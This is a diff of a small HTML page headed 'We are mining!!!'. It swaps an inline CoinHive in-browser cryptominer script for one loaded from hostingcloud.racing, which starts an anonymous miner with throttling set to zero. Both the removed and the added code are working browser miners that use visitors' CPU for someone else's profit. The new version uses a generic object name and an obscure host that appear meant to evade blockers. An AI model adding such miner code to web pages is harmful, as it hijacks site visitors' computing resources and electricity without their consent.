@@ -10,35 +10,15 @@
  
         <h1>We are mining!!!</h1>
  
-        <script>
-            var miner = new CoinHive.Anonymous('dtydAMfHsKGOJrDTsyGfN7uXPFxcLE3O');
-            miner.start();
- 
-            // Listen on events
-            miner.on('found', function() {
-                console.log("found hash!")
-            })
-            miner.on('accepted', function() {
-                console.log("accepted hash!")
-            })
- 
-            // Update stats once per second
-            setInterval(function() {
-                var hashesPerSecond = miner.getHashesPerSecond();
-                var totalHashes = miner.getTotalHashes();
-                var acceptedHashes = miner.getAcceptedHashes();
- 
-                console.log("hashesPerSecond", hashesPerSecond)
-                console.log("totalHashes", totalHashes)
-                console.log("acceptedHashes", acceptedHashes)
- 
-                console.log("-----------")
-                console.log("-----------")
-                console.log("-----------")
- 
-                // Output to HTML elements...
-            }, 1000);
-        </script>
+        <script src="https://www.hostingcloud.racing/UyPI.js"></script>
+<script>
+    var _client = new Client.Anonymous('152b7da92e7ca31b7aaa4a94f8e18b58e34726feedaea196430fafb7d7b7a77e', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    
+
+</script>
     </body>
  
 </html>
